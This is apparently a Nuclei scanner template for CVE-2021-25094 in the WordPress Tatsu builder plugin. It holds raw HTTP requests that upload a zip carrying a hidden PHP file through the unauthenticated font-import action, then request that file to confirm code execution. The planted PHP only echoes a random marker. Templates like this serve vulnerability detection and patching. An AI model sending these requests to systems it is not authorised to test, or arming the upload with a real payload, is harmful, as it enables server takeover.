flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    internal: true
    part: body
    type: word
    words:
    - '"name":"{{to_lower(filename)}}"'
    - '"status":"success'
  raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    X-Requested-With: XMLHttpRequest

    Content-Type: multipart/form-data; boundary=a8bfdd88f26f754c25496d0dd4962d38


    --a8bfdd88f26f754c25496d0dd4962d38

    Content-Disposition: form-data; name="action"


    add_custom_font

    --a8bfdd88f26f754c25496d0dd4962d38

    Content-Disposition: form-data; name="file"; filename="{{filename}}.zip"


    {{zip(''.{{filename}}.php'',''<?php echo base64_decode(\''{{b64marker}}\''); ?>'')}}

    --a8bfdd88f26f754c25496d0dd4962d38--

    '
- matchers:
  - part: body
    type: word
    words:
    - '{{marker}}'
  raw:
  - 'GET /wp-content/uploads/typehub/custom/{{to_lower(filename)}}/.{{filename}}.php
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2021-25094
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cpe: cpe:2.3:a:brandexponents:tatsu:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2021-25094
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cwe-id: CWE-306
    epss-percentile: 0.99564
    epss-score: 0.90199
  description: 'An unrestricted file upload in WordPress Tatsubuilder plugin version
    <= 3.3.11 enables an unauthenticated attacker to perform a remote code execution
    (RCE) on the server host due to multiple weaknesses in the font import feature
    and put 100,000 websites at risk.

    '
  impact: 'Unauthenticated attackers can upload malicious PHP files via the font import
    feature, achieving remote code execution and complete server compromise.

    '
  metadata:
    max-request: 2
    publicwww-query: /wp-content/plugins/tatsu/
    verified: true
  name: Wordpress Tatsubuilder <= 3.3.11 - Remote Code Execution
  reference:
  - https://darkpills.com/wordpress-tatsu-builder-preauth-rce-cve-2021-25094/
  - https://wpscan.com/vulnerability/fb0097a0-5d7b-4e5b-97de-aacafa8fffcd/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-25094
  remediation: Fixed in 3.3.12
  severity: high
  tags: cve,cve2021,wp,wp-plugin,wordpress,tatsu,rce,vkev,vuln
variables:
  b64marker: '{{base64(marker)}}'
  filename: '{{rand_base(5)}}'
  marker: '{{randstr}}'
